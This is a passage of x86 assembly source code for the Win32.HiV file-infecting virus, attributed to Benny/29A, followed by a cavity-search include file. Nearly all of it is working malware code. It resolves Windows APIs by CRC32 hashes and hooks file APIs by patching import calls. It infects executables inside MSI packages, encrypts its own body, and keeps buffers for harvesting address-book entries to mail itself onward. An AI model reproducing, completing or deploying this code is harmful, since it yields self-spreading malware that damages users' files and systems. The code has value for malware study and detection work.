	push	MEM_DECOMMIT
	push	8192
	push	esi
	call	[ebp + a_VirtualFree - gd]

	push	MEM_RELEASE
	push	0
	push	esi
	call	[ebp + a_VirtualFree - gd]
	ret

;this procedure can retrieve API addresses
get_apis	Proc
	pushad
	@SEH_SetupFrame	<jmp q_gpa>
	lea	esi,[ebp + crc32s - gdelta]	;get ptr to CRC32 values of APIs
	lea	edi,[ebp + a_apis - gdelta]	;where to store API addresses
	push	crc32c    		;how many APIs do we need
	pop	ecx			;in ECX...
g_apis:	push	eax			;save K32 base
	call	get_api
	stosd				;save address
	test	eax,eax
	pop	eax
	je	q_gpa			;quit if not found
	add	esi,4			;move to next CRC32 value
	loop	g_apis			;search for API addresses in a loop
	jmp	end_seh			;and quit
q_gpa:	@SEH_RemoveFrame
	popad
	pop	eax
	jmp	end_host		;quit if error
get_apis	EndP


a_go:	inc	esi				;jump over alignments
	inc	esi
	pushad					;store all registers
	xor	edx,edx				;zero EDX
	xchg	eax,esi
	push	2
	pop	ecx
	div	ecx
	test	edx,edx
	je	end_align			;no alignments needed
	inc	eax
end_align:
	mul	ecx				;align API name
	mov	[esp.Pushad_esi],eax
	popad					;restore all registers
	ret					;and quit from procedure


;this procedure can patch API calls (both of MS and Borland style)
patch_IT	Proc
	pushad				;store all registers
	@SEH_SetupFrame	<jmp	endPIT>	;setup SEH frame
	call	itDlta
itDelta:db	0b8h
itDlta:	pop	ebp
	mov	[ebp + gmh - itDelta],eax	;save it
	mov	ebx,[eax.MZ_lfanew]		;get to PE header
	add	ebx,eax				;make pointer raw
	push	dword ptr [ebx.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_VirtualAddress]
	call	rva2raw
	pop	edx
	sub	edx,IMAGE_SIZEOF_IMPORT_DESCRIPTOR
	push	edi
n_dll:	pop	edi
	add	edx,IMAGE_SIZEOF_IMPORT_DESCRIPTOR
	mov	ecx,12345678h
inet_k32 = dword ptr $-4
	jecxz	szInet
	@getsz	'KERNEL32.dll',edi
	jmp	o_inet
szInet:	@getsz	'WININET.dll',edi
o_inet:	mov	esi,[edx]
	test	esi,esi
	je	endPIT
sdll:	push	dword ptr [edx.ID_Name]
	call	rva2raw
	pop	esi
	push	edi
	cmpsd					;is it our library?
	jne	n_dll
	cmpsd
	jne	n_dll
	cmpsd
	jne	n_dll
	pop	edi
	xor	ecx,ecx				;zero counter
	push	dword ptr [edx.ID_OriginalFirstThunk]	;get first record
	call	rva2raw
	pop	esi
	push	dword ptr [esi]			;get first API name
	call	rva2raw
	pop	esi
pit_align:
	call	a_go
	push	esi				;store pointer
	@endsz					;get to the end of API name
	mov	edi,esi
	sub	edi,[esp]			;move size of API name to EDI
	pop	esi				;restore pointer
	push	eax				;store EAX
	call	CRC32				;calculate CRC32 of API name
	cmp	eax,[esp.cPushad+10h]		;check, if it is requested API
	je	a_ok				;yeah, it is
	inc	ecx
	mov	eax,[esi]			;check, if there is next API
	test	eax,eax				;...
	pop	eax				;restore EAX
	jne	pit_align			;yeah, check it
	jmp	endPIT				;no, quit
a_ok:	pop	eax				;restore EAX
	push	dword ptr [edx.ID_FirstThunk]	;get address to IAT
	call	rva2raw
	pop	edx
	mov	eax,[edx+ecx*4]			;get address
	mov	[esp.Pushad_eax+8],eax		;and save it to stack
	pushad					;store all registers
	mov	eax,0				;get base address of program
gmh = dword ptr $-4
	mov	ebx,[eax.MZ_lfanew]
	add	ebx,eax				;get PE header
						;get base of code
	push	dword ptr [ebx.NT_OptionalHeader.OH_BaseOfCode]
	call	rva2raw				;normalize
	pop	esi				;to ESI
	mov	ecx,[ebx.NT_OptionalHeader.OH_SizeOfCode]
	pushad					;and its size
	call	p_var
	dd	?
p_var:	push	PAGE_EXECUTE_READWRITE
	push	ecx
	push	esi				;allow to modify protected code
	call	[ebp + a_VirtualProtect - itDelta]
	popad
sJMP:	mov	dl,[esi]			;get byte from code
	inc	esi
	cmp	dl,0FFh				;is it JMP/CALL?
	jne	lJMP		                ;check, if it is          
	cmp	byte ptr [esi],25h              ;JMP DWORD PTR [XXXXXXXXh]
	je	gIT1                                                            
	cmp	byte ptr [esi],15h		;or CALL DWORD PTR [XXXXXXXXh]
	jne	lJMP
	mov	dl,0E8h
	jmp	gIT2
gIT1:	mov	dl,0E9h
gIT2:	mov	[ebp + j_or_c - itDelta],dl	;change opcode
	mov	edi,[ebx.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_VirtualAddress]
	add	edi,[ebx.NT_OptionalHeader.OH_DirectoryEntries.DE_Import.DD_Size]
	push	ecx
	mov	ecx,[ebx.NT_OptionalHeader.OH_ImageBase]
	add	edi,ecx
	push	ebp
	mov	ebp,[esi+1]
	sub	ebp,ecx
	push	ebp
	call	rva2raw
	pop	ebp
	sub	ebp,eax
	add	ebp,ecx
	sub	edi,ebp
	pop	ebp
	pop	ecx
	js	lJMP				;check, if it is correct address
	push	ecx
	push	edx				;store EDX
	mov	edx,[esp.Pushad_ecx+8]		;get counter
	imul	edx,4				;multiply it by 4
	add	edx,[esp.Pushad_edx+8]		;add address to IAT to ptr
	sub	edx,eax
	mov	ecx,[esi+1]
	sub	ecx,[ebx.NT_OptionalHeader.OH_ImageBase]
	push	ecx
	call	rva2raw
	pop	ecx
	sub	ecx,eax
	cmp	edx,ecx				;is it current address
	pop	edx
	pop	ecx				;restore EDX
	jne	sJMP				;no, get next address
	mov	eax,[esi+1]
	mov	[esp.cPushad.Pushad_eax+8],eax	;store register to stack
	mov	[esp.Pushad_esi],esi		;for l8r use
	popad					;restore all registers

	mov	byte ptr [esi-1],0E9h		;build JMP or CALL
j_or_c = byte ptr $-1
	mov	ebx,[esi+1]
	mov	eax,[esp.cPushad+10h]		;get address
	add	eax,[ebp + gmh - itDelta]
	sub	eax,esi				;- current address
	sub	eax,4				;+1-5
	mov	[esi],eax			;store built jmp instruction
	mov	byte ptr [esi+4],90h
	xchg	eax,ebx
	jmp	endIT				;and quit
lJMP:	dec	ecx
	jecxz	endPIT-1
	jmp	sJMP				;search in a loop
	popad					;restore all registers
endPIT:	xor	eax,eax
	mov	[esp.Pushad_eax+8],eax
endIT:	@SEH_RemoveFrame			;remove SEH frame
	popad					;restore all registers
	ret	8				;and quit
patch_IT	EndP


;this procedure can converting RVAs to RAW pointers
rva2raw:pushad					;store all registers
	mov	ecx,12345678h			;0 if actual host program
r2rp = dword ptr $-4
	jecxz	nr2r
	mov	edx,[esp.cPushad+4]
	movzx	ecx,word ptr [ebx.NT_FileHeader.FH_NumberOfSections]
	movzx	esi,word ptr [ebx.NT_FileHeader.FH_SizeOfOptionalHeader]
	lea	esi,[esi+ebx+IMAGE_SIZEOF_FILE_HEADER+4]
n_r2r:	mov	edi,[esi.SH_VirtualAddress]	;search inside section
	add	edi,[esi.SH_VirtualSize]	;headerz for matches
	cmp	edx,edi
	jb	c_r2r
	add	esi,IMAGE_SIZEOF_SECTION_HEADER
	loop	n_r2r
	popad					;restore all registers
	ret					;and quit
nr2r:	add	[esp.cPushad+4],eax
	popad					;restore all registers
	ret					;and quit
c_r2r:	add	eax,[esi.SH_PointerToRawData]	;correct RVA to RAW pointer
	add	eax,edx
	sub	eax,[esi.SH_VirtualAddress]
	mov	[esp.cPushad+4],eax		;save it
	popad
	ret


;this procedure can open file - used in resident mode
;input: EBX - filename to open
resCreate_FileA	Proc
	and	dword ptr [ebp + cfa_patch - gd],0
	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
		db	6ah		;PUSH SHORT
cfa_flagz	db	OPEN_EXISTING
	push	eax
	push	eax
	push	GENERIC_READ or GENERIC_WRITE
	push	ebx
	call	[ebp + a_CreateFileA - gd]
	mov	[ebp + cfa_patch - gd],ebp
	ret
resCreate_FileA	EndP


;this procedure can open file - used in non-resident mode
;input: EBX - filename to open
Create_FileA	Proc
	xor	eax,eax
	push	eax
	push	FILE_ATTRIBUTE_NORMAL
	push	OPEN_ALWAYS
	push	eax
	push	eax
	push	GENERIC_READ or GENERIC_WRITE
	push	ebx
	call	[ebp + a_CreateFileA - gdelta]
	ret
Create_FileA	EndP


;this procedure can create file mapping object - used in non-resident mode
;input: EAX - opened handle of file
Create_FileMappingA	Proc
	cdq
	push	edx
	push	edx
	push	edx
	push	PAGE_READWRITE
	push	edx
	push	eax
	call	[ebp + a_CreateFileMappingA - gdelta]
	ret
Create_FileMappingA	EndP


;this procedure can map view of file - used in non-resident mode
;input: ECX - opened handle of file mapping object
Map_ViewOfFile	Proc
	push	0
	push	0
	push	0
	push	FILE_MAP_WRITE
	push	ecx
	call	[ebp + a_MapViewOfFile - gdelta]
	ret
Map_ViewOfFile	EndP


;this procedure can convert number to ASCII decimal format
;input: EAX - number
;output: [EDI] - stored ASCII number
Num2Ascii	Proc
	push	esi
	push	edi
	lea	edi,[ebp + dec_buff - gdelta]

	push	10
	pop	ecx
g_str:	xor	edx,edx
	div	ecx
	add	edx,'0'
	xchg	eax,edx
	stosb
	xchg	eax,edx
	test	eax,eax
	jne	g_str
	pop	esi
	xchg	esi,edi
	dec	esi
cpy_num:std
	lodsb
	cld
	stosb
	cmp	al,11h
	jne	cpy_num
	dec	edi
	xor	al,al
	stosb
	pop	esi
	ret
Num2Ascii	EndP


;this is MSI loader - virus places this procedure into EXE files inside MSIs
msi_start	Proc
	pushad
	call	mdelta
mdelta:	pop	ebp			;get delta offset
	call	get_base		;get base of K32
	test	eax,eax
	je	end_msi

	push	eax
	call	crc32m1
	dd	04134D1ADh		;LoadLibraryA
	dd	0AFDF191Fh		;FreeLibrary
	dd	0FFC97C1Fh		;GetProcAddress
crc32m1:pop	esi
	call	get_api			;get addresses of these APIs
	xchg	eax,ecx
	pop	eax
	test	ecx,ecx
	je	end_msi
	push	eax
	add	esi,4
	call	get_api			;...
	xchg	eax,edi
	test	edi,edi
	pop	eax
	je	end_msi
	add	esi,4
	push	eax
	call	get_api			;...
	xchg	eax,edx
	test	edx,edx
	pop	eax
	je	end_msi

	push	edx
	@pushsz	'USER32'
	call	ecx			;load USER32.DLL library
	xchg	eax,esi
	test	esi,esi
	pop	edx
	je	end_msi

	@pushsz	'MessageBoxA'
	push	esi
	call	edx			;get address of MessageBoxA API
	xchg	eax,ecx
	test	ecx,ecx
	je	freelib

	push	1000h
	@pushsz	'[Win32.HiV] by Benny/29A'
szTitle:call	szMsg
p_msg:	db	'This cell has been infected by HIV virus, generation: '
gcount:	db	'0000000000',0
szMsg:	push	0
	call	ecx			;show lame message :)

freelib:push	esi
	call	edi			;unload USER32.DLL

end_msi:popad
	mov	eax,offset ExitProcess
msi_entrypoint = dword ptr $-4
	jmp	eax			;and quit to host


;this procedure can get base address of K32
get_base	Proc
	push	ebp			;store EBP
	call	gdlt			;get delta offset
gdlt:	pop	ebp			;to EBP

	mov	eax,12345678h		;get lastly used address
last_kern = dword ptr $-4
	call	check_kern		;is this address valid?
	jecxz	end_gb			;yeah, we got the address

	call	gb_table		;jump over the address table
	dd	077E00000h		;NT/W2k
	dd	077E80000h		;NT/W2k
	dd	077ED0000h		;NT/W2k
	dd	077F00000h		;NT/W2k
	dd	0BFF70000h		;95/98
gb_table:
	pop	edi			;get pointer to address table
	push	4			;get number of items in the table
	pop	esi			;to ESI
gbloop:	mov	eax,[edi+esi*4]		;get item
	call	check_kern		;is address valid?
	jecxz	end_gb			;yeah, we got the valid address
	dec	esi			;decrement ESI
	test	esi,esi			;end of table?
	jne	gbloop			;nope, try next item

	call	scan_kern		;scan the address space for K32
end_gb:	pop	ebp			;restore EBP
	ret				;quit

check_kern:				;check if K32 address is valid
	mov	ecx,eax			;make ECX != 0
	pushad				;store all registers
	@SEH_SetupFrame	<jmp	end_ck>	;setup SEH frame
	movzx	edx,word ptr [eax]	;get two bytes
	add	edx,-"ZM"		;is it MZ header?
	jne	end_ck			;nope
	mov 	ebx,[eax.MZ_lfanew]	;get pointer to PE header
	add	ebx,eax			;normalize it
	mov	ebx,[ebx]		;get four bytes
	add	ebx,-"EP"		;is it PE header?
	jne	end_ck			;nope
	xor	ecx,ecx			;we got K32 base address
	mov	[ebp + last_kern - gdlt],eax	;save K32 base address
end_ck:	@SEH_RemoveFrame		;remove SEH frame
	mov	[esp.Pushad_ecx],ecx	;save ECX
	popad				;restore all registers
	ret				;if ECX == 0, address was found


SEH_hndlr macro				;macro for SEH
        @SEH_RemoveFrame		;remove SEH frame
	popad				;restore all registers
        add	dword ptr [ebp + bAddr - gdlt],1000h	;explore next page
        jmp	bck			;continue execution
endm

scan_kern:				;scan address space for K32
bck:    pushad				;store all registers
	@SEH_SetupFrame	<SEH_hndlr>	;setup SEH frame
	mov	eax,077000000h		;starting/last address
bAddr = dword ptr $-4
	movzx	edx,word ptr [eax]	;get two bytes
	add	edx,-"ZM"		;is it MZ header?
	jne	pg_flt			;nope
	mov 	edi,[eax.MZ_lfanew]	;get pointer to PE header
	add	edi,eax			;normalize it
	mov	ebx,[edi]		;get four bytes
	add	ebx,-"EP"		;is it PE header?
	jne	pg_flt			;nope
	mov	ebx,eax
	mov	esi,eax
	add	ebx,[edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
	add	esi,[ebx.ED_Name]
	mov	esi,[esi]
	add	esi,-'NREK'
	je	end_sk
pg_flt:	xor	ecx,ecx			;we got K32 base address
	mov	[ecx],esi		;generate PAGE FAULT! search again...
end_sk:	mov	[ebp + last_kern - gdlt],eax	;save K32 base address
	@SEH_RemoveFrame		;remove SEH frame
	mov	[esp.Pushad_eax],eax	;save EAX - K32 base
	popad				;restore all registers
	ret
get_base	EndP


;this procedure can retrieve address of given API
get_api		Proc
	pushad				;store all registers
	@SEH_SetupFrame	<jmp	end_gpa>;setup SEH frame
	mov	edi,[eax.MZ_lfanew]	;move to PE header
	add	edi,eax			;...
	mov	ecx,[edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_Size]
	jecxz	end_gpa			;quit if no exports
	mov	ebx,eax
	add	ebx,[edi.NT_OptionalHeader.OH_DirectoryEntries.DE_Export.DD_VirtualAddress]
	mov	edx,eax			;get address of export table
	add	edx,[ebx.ED_AddressOfNames]	;address of API names
	mov	ecx,[ebx.ED_NumberOfNames]	;number of API names
	mov	edi,edx
	push	dword ptr [esi]		;save CRC32 to stack
	mov	ebp,eax
	xor	eax,eax
APIname:push	eax
	mov	esi,ebp			;get base
	add	esi,[edx+eax*4]		;move to API name
	push	esi			;save address
	@endsz				;go to the end of string
	sub	esi,[esp]		;get string size
	mov	edi,esi			;move it to EDI
	pop	esi			;restore address of API name
	call	CRC32			;calculate CRC32 of API name
	cmp	eax,[esp+4]		;is it right API?
	pop	eax
	je	g_name			;yeah, we got it
	inc	eax                     ;increment counter
	loop	APIname			;and search for next API name
	pop	eax
end_gpa:xor	eax, eax		;set flag
ok_gpa:	@SEH_RemoveFrame		;remove SEH frame
	mov	[esp.Pushad_eax],eax	;save value to stack
	popad				;restore all registers
        ret				;quit from procedure
g_name:	pop	edx
	mov	edx,ebp
	add	edx,[ebx.ED_AddressOfOrdinals]
	movzx	eax,word ptr [edx+eax*2]
	cmp	eax,[ebx.ED_NumberOfFunctions]
	jae	end_gpa-1
	mov	edx,ebp			;base of K32
	add	edx,[ebx.ED_AddressOfFunctions]	;address of API functions
	add	ebp,[edx+eax*4]		;get API function address
	xchg	eax,ebp			;we got address of API in EAX
	jmp	ok_gpa			;quit
get_api		EndP


CRC32:	push	ecx			;procedure for calculating CRC32s
	push	edx			;at run-time
	push	ebx       
        xor	ecx,ecx   
        dec	ecx        
        mov	edx,ecx   
NextByteCRC:           
        xor	eax,eax   
        xor	ebx,ebx   
        lodsb          
        xor	al,cl     
	mov	cl,ch
	mov	ch,dl
	mov	dl,dh
	mov	dh,8
NextBitCRC:
	shr	bx,1
	rcr	ax,1
	jnc	NoCRC
	xor	ax,08320h
	xor	bx,0EDB8h
NoCRC:  dec	dh
	jnz	NextBitCRC
	xor	ecx,eax
	xor	edx,ebx
        dec	edi
	jne	NextByteCRC
	not	edx
	not	ecx
	pop	ebx
	mov	eax,edx
	rol	eax,16
	mov	ax,cx
	pop	edx
	pop	ecx
	ret
msi_end:
msi_start	EndP


;CRC32s of APIz
crc32s:	dd	0DCF6E06Ch		;GetEnvironmentVariableA
	dd	033D350C4h		;OpenProcess
	dd	068624A9Dh		;CloseHandle
	dd	019F33607h		;CreateThread
	dd	079C3D4BBh		;VirtualProtect
	dd	0FFC97C1Fh		;GetProcAddress
	dd	04A27089Fh		;ReadProcessMemory
	dd	00E9BBAD5h		;WriteProcessMemory
	dd	056E1B657h		;VirtualProtectEx
	dd	0D4AFA114h		;VirtualQueryEx
	dd	04402890Eh		;VirtualAlloc
	dd	02AAD1211h		;VirtualFree
	dd	0DA89FC22h		;VirtualAllocEx
	dd	03C19E536h		;SetFileAttributesA
	dd	08C892DDFh		;CreateFileA
	dd	096B2D96Ch		;CreateFileMappingA
	dd	0797B49ECh		;MapViewOfFile
	dd	094524B42h		;UnmapViewOfFile
	dd	085859D42h		;SetFilePointer
	dd	059994ED6h		;SetEndOfFile
	dd	04B2A3E7Dh		;SetFileTime
	dd	0CC09D51Eh		;DeviceIoControl
	dd	0AE17EBEFh		;FindFirstFileA
	dd	0AA700106h		;FindNextFileA
	dd	0C200BE21h		;FindClose
	dd	04134D1ADh		;LoadLibraryA
	dd	0AFDF191Fh		;FreeLibrary
	dd	021777793h		;WriteFile
	dd	0DE256FDEh		;DeleteFileA
	dd	004DCF392h		;GetModuleFileNameA
	dd	082B618D4h		;GetModuleHandleA
	dd	052E3BEB1h		;IsDebuggerPresent
	dd	0EF7D811Bh		;GetFileSize
	dd	054D8615Ah		;ReadFile
crc32c = ($-crc32s)/4			;number of APIz


;CRC32s of APIz for hooking
crcRes:	dd	0AE17EBEFh		;FindFirstFileA
	dd	0AA700106h		;FindNextFileA
	dd	05BD05DB1h		;CopyFileA
	dd	02308923Fh		;MoveFileA
	dd	08C892DDFh		;CreateFileA
crcResCount = ($-crcRes)/4


;pointerz to pointerz to APIz in memory
posRes:	dd	offset posFindFirstFileA
	dd	offset posFindNextFileA
	dd	offset posCopyFileA
	dd	offset posMoveFileA
	dd	offset posCreateFileA

;pointerz to API hookerz
newRes:	dd	offset newFindFirstFileA-Start
	dd	offset newFindNextFileA-Start
	dd	offset newCopyFileA-Start
	dd	offset newMoveFileA-Start
	dd	offset newCreateFileA-Start

;pointerz to memory where will be saved 5 original bytes of APIz
oldRes:	dd	offset oldFindFirstFileA
	dd	offset oldFindNextFileA
	dd	offset oldCopyFileA
	dd	offset oldMoveFileA
	dd	offset oldCreateFileA

	db	11h
end_virus:				;end of virus in file
	dec_buff		db	10 dup (?)

	align	4
a_apis:					;addresses of APIs
a_GetEnvironmentVariableA	dd	?
a_OpenProcess			dd	?
a_CloseHandle			dd	?
a_CreateThread			dd	?
a_VirtualProtect		dd	?
a_GetProcAddress		dd	?
a_ReadProcessMemory		dd	?
a_WriteProcessMemory		dd	?
a_VirtualProtectEx		dd	?
a_VirtualQueryEx		dd	?
a_VirtualAlloc			dd	?
a_VirtualFree			dd	?
a_VirtualAllocEx		dd	?
a_SetFileAttributesA		dd	?
a_CreateFileA			dd	?
a_CreateFileMappingA		dd	?
a_MapViewOfFile			dd	?
a_UnmapViewOfFile		dd	?
a_SetFilePointer		dd	?
a_SetEndOfFile			dd	?
a_SetFileTime			dd	?
a_DeviceIoControl		dd	?
a_FindFirstFileA		dd	?
a_FindNextFileA			dd	?
a_FindClose			dd	?
a_LoadLibraryA			dd	?
a_FreeLibrary			dd	?
a_WriteFile			dd	?
a_DeleteFileA			dd	?
a_GetModuleFileNameA		dd	?
a_GetModuleHandleA		dd	?
a_IsDebuggerPresent		dd	?
a_GetFileSize			dd	?
a_ReadFile			dd	?

WFD		WIN32_FIND_DATA	?	;WIN32_FIND_DATA structure

mbi:			dd	?	;MEMORY_BASIC_INFORMATION
			dd	?	;structure needed by
			dd	?	;VirtualQueryEx API
	reg_size	dd	?	;number of pages with same rights*size of one page
	reg_state	dd	?	;state of page(s)
			dd	?
			dd	?
mbi_size = dword ptr $-mbi

reg_buffer		db	MAX_PATH dup (?);some bufferz with multiply
wab_buffer		db	MAX_PATH dup (?);usage

MAPIMessage		dd	12 dup (?)	;MAPI message
MsgFrom			dd	6 dup (?)	;Sender structure
MsgTo			dd	5*6 dup (?)	;Recipient structure
MAPIFileDesc		dd	6 dup (?)	;Attachment structure

mails			db	22h*5 dup (?)	;space for 5 mail addresses
						;extracted from address book
virtual_end:					;end of virus in memory

.code						;first generation code
FirstGeneration:
	pushad					;encrypt virus body
	mov	esi,offset encrypted
	mov	edi,esi
	mov	ecx,(end_virus-encrypted+3)/4
encrypt:lodsd
	xor	eax,12345678h			;encrypt virus
	stosd
	loop	encrypt
	popad

	enter	0,0				;prolog of procedure
	push	ebx
	push	esi
	push	edi
E_EPO:	jmp	Start				;jump to virus code
						;(will be overwritten by
						;procedure's epilog)
	;size of virus raw data
	db	0dh,0ah,'Virus size in file: '
	db	'0'+((end_virus-Start)/1000) mod 10
	db	'0'+((end_virus-Start)/100) mod 10
	db	'0'+((end_virus-Start)/10) mod 10
	db	'0'+((end_virus-Start)/1) mod 10

	;virtual size of virus
	db	0dh,0ah,'Virus size in memory: '
	db	'0'+((virtual_end-Start)/1000) mod 10
	db	'0'+((virtual_end-Start)/100) mod 10
	db	'0'+((virtual_end-Start)/10) mod 10
	db	'0'+((virtual_end-Start)/1) mod 10
	db	0dh,0ah

ends						;end of first generation code
End	FirstGeneration				;end of everything :)
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[HIV.ASM]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[CSE.INC]ÄÄÄ
;-----------------------------------------------------------------------------
; Cavity search engine Benny and Darkman of 29A
;
; Calling parameters:
; ECX = size of search area
; ESI = pointer to search area
;
; Return parameters:
; ESI = pointer to cave
;
; Changed registers:
; EAX, EBX, ECX, EDX, ESI	

CSE:	pushad
	lodsb				; AL = byte within search area
reset_cavity_loop:
	xchg	eax,ebx			; BL =  "     "      "     "
	xor	edx,edx			; Zero EDX
	dec	ecx			; Decrease counter
	jecxz	no_cave_found		; Zero ECX? Jump to no_cave_found
find_cave_loop:	
	lodsb				; AL = byte within search area
	cmp	al,bl			; Current byte equal to previous byte?
	jne	reset_cavity_loop	; Not equal? Jump to reset_cavity_loop
	inc	edx			; Increase number of bytes found in
					; cave
	cmp	edx,msi_end-msi_start	; Found a cave large enough?
	jne	find_cave_loop		; Not equal? Jump to find_cave_loop
	sub	esi,msi_end-msi_start	; ESI = pointer to cave
	mov	[esp.Pushad_esi],esi
	popad

;-----------------------------------------------------------------------------
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[CSE.INC]ÄÄÄ
